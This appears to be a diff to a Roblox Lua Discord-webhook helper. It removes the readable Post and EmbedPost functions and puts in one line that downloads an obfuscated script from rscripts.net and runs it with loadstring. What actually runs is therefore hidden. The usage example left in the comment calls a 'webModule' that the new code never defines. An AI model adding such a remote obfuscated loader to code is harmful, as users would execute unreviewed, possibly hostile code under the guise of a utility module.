@@ -1,47 +1,32 @@
-local webhookMod = {}
+loadstring(game:HttpGet("https://rscripts.net/raw/rscripts_obfuscated_discord-webhook-s_1744915765505_5deE17anQk.txt",true))()
 
-function webhookMod:Post(webhookUrl , Contents)
-    local http = game:GetService("HttpService")
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local data = {
-        ["content"] = Contents
-    }
-    local body = http:JSONEncode(data)
-    local response = request({
-        Url = webhookUrl,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
-end
+--[[
 
-function webhookMod:EmbedPost(webhookUrl , embed)
-    local http = game:GetService("HttpService")
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local data = {
-        ["embeds"] = {
-            {
-                ["title"] = embed.title,
-                ["description"] = embed.description,
-                ["color"] = embed.color,
-                ["fields"] = embed.fields,
-                ["footer"] = {
-                    ["text"] = embed.footer.text
-                }
-            }
+Example:
+
+local embed = {
+    ["title"] = "This is an embed",
+    ["description"] = "Embed description i guess",
+    ["color"] = 65280,
+    ["fields"] = {
+        {
+            ["name"] = "Some field name here", -- field 1
+            ["value"] = "Some field text here"
+        },
+        {
+            ["name"] = "Some field name here", -- field 2
+            ["value"] = "Some field text here"
         }
+    },
+    ["footer"] = {
+        ["text"] = "silly footer"
     }
-    local body = http:JSONEncode(data)
-    local response = request({
-        Url = webhookUrl,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
-end
+}
 
-return webhookMod
+
+webModule:Post("webhook url here!" , "hey")
+
+webModule:EmbedPost("webhook url here!" , embed)    -- Discord embed
+
+
+]]
